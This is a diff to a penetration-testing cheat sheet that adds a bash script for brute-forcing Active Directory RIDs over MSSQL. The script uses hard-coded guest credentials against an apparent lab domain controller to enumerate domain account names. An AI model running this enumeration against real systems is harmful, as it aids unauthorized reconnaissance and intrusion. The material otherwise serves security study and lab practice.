@@ -206,6 +206,24 @@ rpcclient $> enumdomusers
 # Display Query Information
 rpcclient $> querydispinfo
 ```
+
+### MSSQL(Brute RID)
+```bash
+#!/bin/bash
+
+check_rid() {
+    SID_BASE="010500000000000515000000a185deefb22433798d8e847a"
+    local RID=$1
+    local HEX_RID=$(python -c "import struct; print(struct.pack('<I', ${RID}).hex())")
+    local SID="${SID_BASE}${HEX_RID}"
+    local RES=$(mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -file <( echo "select SUSER_SNAME(0x${SID});") 2>&1 | sed -n '/^----/{n;p;}')
+
+    if [[ "$(echo "$RES" | xargs)" != "NULL" ]]; then echo "${RID}: ${RES}"; fi
+}
+
+export -f check_rid 
+seq 1000 1500 | xargs -P 48 -I{} bash -c 'check_rid $@' _ {}
+```
   
 </details>
 
